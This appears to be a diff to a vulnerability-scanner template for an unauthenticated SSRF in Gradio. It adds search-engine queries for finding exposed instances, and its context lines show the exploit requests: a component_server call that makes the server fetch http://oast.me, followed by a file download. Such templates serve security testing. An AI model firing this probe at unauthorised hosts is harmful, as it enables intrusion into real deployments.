@@ -17,11 +17,16 @@ info:
   metadata:
     verified: true
     max-request: 2
-    shodan-query: html:"__gradio_mode__"
-    product: gradio
     vendor: gradio_project
+    product: gradio
+    shodan-query:
+      - http.html:"__gradio_mode__"
+      - http.title:"gradio"
+    fofa-query:
+      - body="__gradio_mode__"
+      - title="gradio"
+    google-query: intitle:"gradio"
   tags: cve,cve2024,unauth,gradio,ssrf
-
 flow: http(1) && http(2)
 
 http:
@@ -29,11 +34,9 @@ http:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-
       - |
         GET /component_server HTTP/1.1
         Host: {{Hostname}}
-
 
     matchers:
       - type: dsl
@@ -50,7 +53,6 @@ http:
         Content-Type: application/json
 
         {"component_id": "{{fuzz_component_id}}", "data": "http://oast.me", "fn_name": "download_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}
-
       - |
         GET /file={{download_path}} HTTP/1.1
         Host: {{Hostname}}
@@ -63,11 +65,10 @@ http:
         regex:
           - "\"?([^\"]+)"
         internal: true
-
     payloads:
       fuzz_component_id: helpers/wordlists/numbers.txt
-
     stop-at-first-match: true
+
     matchers-condition: and
     matchers:
       - type: word
